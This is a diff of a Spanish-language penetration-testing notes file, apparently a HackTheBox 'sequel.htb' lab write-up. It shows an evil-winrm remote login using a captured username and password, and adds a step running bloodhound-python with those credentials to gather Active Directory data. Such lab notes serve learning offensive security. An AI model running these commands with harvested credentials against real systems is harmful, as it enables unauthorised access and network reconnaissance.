@@ -272,5 +272,12 @@ Vemos que pertenece asi que nos conectamos
 evil-winrm -i 10.128.232.128 -u ryan -p WqSZAF6CysDQbGb3
 ```
 
+## BloodHound
 
+Desde fuera en nuestra maquina atacante nos hacemos una recoleccion de informacion para pasarla a [[BLOODHOUND]]
+```shell
+bloodhound-python -d sequel.htb -ns 10.129.232.128 -u 'ryan' -p 'WqSZAF6CysDQbGb3' --zip
+```
 
+Se lo pasamos a [[BLOODHOUND]]
+![[Pasted image 20260211200805.png]]
